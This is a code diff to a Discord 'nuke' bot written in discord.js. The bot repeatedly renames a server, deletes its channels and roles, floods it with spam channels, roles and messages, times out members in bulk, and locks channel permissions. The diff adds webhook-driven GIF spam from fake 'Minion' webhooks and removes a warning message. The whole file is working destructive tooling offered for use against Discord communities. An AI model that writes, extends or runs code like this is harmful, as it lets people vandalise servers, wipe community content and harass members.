@@ -12,18 +12,25 @@ const client = new Client({
   ],
 });
 
-// ================== EXTREME CONFIG ==================
+// ================== CONFIG ==================
 const TOKEN = process.env.TOKEN;
 const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
-const CHAOS_INTERVAL = Number(process.env.CHAOS_INTERVAL) || 12 * 1000; // 12 seconds
+const CHAOS_INTERVAL = Number(process.env.CHAOS_INTERVAL) || 12 * 1000;
 const MAX_ACTIONS_PER_TICK = Number(process.env.MAX_ACTIONS_PER_TICK) || 25;
+const PROTECTED_CHANNEL = 'aaaaaaaa';
 
-const PROTECTED_CHANNEL = 'aaaaaaaa'; // Will not be deleted
+// ================== GIF SLOTS (PUT YOUR LINKS HERE) ==================
+const GIF_TYPE_1 = [
+  // Example:
+  // 'https://media.giphy.com/media/xxxx/giphy.gif',
+  // 'https://media.giphy.com/media/yyyy/giphy.gif',
+];
 
-if (!TOKEN) {
-  console.error('❌ TOKEN is missing!');
-  process.exit(1);
-}
+const GIF_TYPE_2 = [
+  // Example:
+  // 'https://media.giphy.com/media/zzzz/giphy.gif',
+  // 'https://media.giphy.com/media/wwww/giphy.gif',
+];
 
 // ================== LISTS ==================
 const SERVER_NAMES = [
@@ -54,17 +61,34 @@ const MESSAGES = [
 
 // ================== HELPERS ==================
 function randomItem(arr) {
+  if (!arr || arr.length === 0) return null;
   return arr[Math.floor(Math.random() * arr.length)];
 }
 
-// ================== EXTREME ACTIONS ==================
+async function getOrCreateWebhook(channel) {
+  try {
+    const webhooks = await channel.fetchWebhooks();
+    let webhook = webhooks.find(wh => wh.name === 'Minion');
+    if (!webhook) {
+      webhook = await channel.createWebhook({
+        name: 'Minion',
+        reason: 'Chaos Minion',
+      });
+    }
+    return webhook;
+  } catch (err) {
+    return null;
+  }
+}
+
+// ================== ACTIONS ==================
 const extremeActions = [
   // Rename server
   async (guild) => {
     await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
   },
 
-  // Mass delete channels
+  // Delete channels (except protected)
   async (guild) => {
     const channels = [...guild.channels.cache.values()];
     for (const channel of channels) {
@@ -73,21 +97,20 @@ const extremeActions = [
     }
   },
 
-  // Spam create channels + messages
+  // Create spam channels
   async (guild) => {
-    for (let i = 0; i < 8; i++) {
+    for (let i = 0; i < 6; i++) {
       try {
         const ch = await guild.channels.create({
           name: randomItem(CHANNEL_NAMES),
           type: ChannelType.GuildText,
         });
         await ch.send(randomItem(MESSAGES)).catch(() => {});
-        await ch.send(randomItem(MESSAGES)).catch(() => {});
       } catch (e) {}
     }
   },
 
-  // Delete all roles
+  // Delete roles
   async (guild) => {
     const roles = [...guild.roles.cache.values()];
     for (const role of roles) {
@@ -97,9 +120,9 @@ const extremeActions = [
     }
   },
 
-  // Spam create roles
+  // Create roles
   async (guild) => {
-    for (let i = 0; i < 6; i++) {
+    for (let i = 0; i < 5; i++) {
       await guild.roles.create({
         name: randomItem(ROLE_NAMES),
         color: Colors.Red,
@@ -118,7 +141,7 @@ const extremeActions = [
     }
   },
 
-  // Mass long timeout
+  // Mass timeout
   async (guild) => {
     const members = await guild.members.fetch().catch(() => null);
     if (!members) return;
@@ -128,20 +151,20 @@ const extremeActions = [
     }
   },
 
-  // Mass spam every channel
+  // Normal message spam
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
       c.type === ChannelType.GuildText &&
       c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
     );
     for (const channel of channels.values()) {
-      for (let i = 0; i < 4; i++) {
+      for (let i = 0; i < 3; i++) {
         await channel.send(randomItem(MESSAGES)).catch(() => {});
       }
     }
   },
 
-  // Lock every channel
+  // Lock permissions
   async (guild) => {
     const channels = guild.channels.cache.filter(c => c.manageable);
     for (const channel of channels.values()) {
@@ -154,9 +177,42 @@ const extremeActions = [
     }
   },
 
-  // Change bot name
+  // Change bot nickname
   async (guild) => {
     await guild.members.me.setNickname('EXTREME NUKE').catch(() => {});
+  },
+
+  // ================== MINION (WEBHOOK) GIF SPAM ==================
+  async (guild) => {
+    const channels = guild.channels.cache.filter(c =>
+      c.type === ChannelType.GuildText &&
+      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
+    );
+
+    for (const channel of channels.values()) {
+      const webhook = await getOrCreateWebhook(channel);
+      if (!webhook) continue;
+
+      // Spam a few GIFs from both types
+      for (let i = 0; i < 3; i++) {
+        const useType1 = Math.random() < 0.5;
+        const gif = useType1 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
+
+        if (gif) {
+          await webhook.send({
+            content: gif,
+            username: 'Minion',
+          }).catch(() => {});
+        } else {
+          // fallback if no gifs added yet
+          await webhook.send({
+            content: randomItem(MESSAGES),
+            username: 'Minion',
+          }).catch(() => {});
+        }
+      }
+    }
+    console.log('👾 Minions spammed GIFs');
   },
 ];
 
@@ -167,7 +223,7 @@ async function doExtremeNuke(guild) {
     return;
   }
 
-  console.log(`\n======== EXTREME NUKE on ${guild.name} ========`);
+  console.log(`\n======== EXTREME NUKE + MINIONS on ${guild.name} ========`);
 
   const selected = [...extremeActions]
     .sort(() => 0.5 - Math.random())
@@ -185,9 +241,8 @@ async function doExtremeNuke(guild) {
 
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
-  console.log(`💣 EXTREME NUKE ACTIVE | Every ${CHAOS_INTERVAL / 1000}s`);
-  console.log('This will heavily damage the server.');
-
+  console.log(`💣 EXTREME NUKE + MINIONS ACTIVE | Every ${CHAOS_INTERVAL / 1000}s`);
+  
   setInterval(async () => {
     const guild = TARGET_GUILD_ID
       ? client.guilds.cache.get(TARGET_GUILD_ID)
@@ -201,7 +256,7 @@ client.on('messageCreate', async (message) => {
   if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
 
   if (message.content === '!nuke') {
-    await message.reply('💣 **EXTREME NUKE LAUNCHED**');
+    await message.reply('💣 **EXTREME NUKE + MINIONS LAUNCHED**');
     await doExtremeNuke(message.guild);
   }
 });
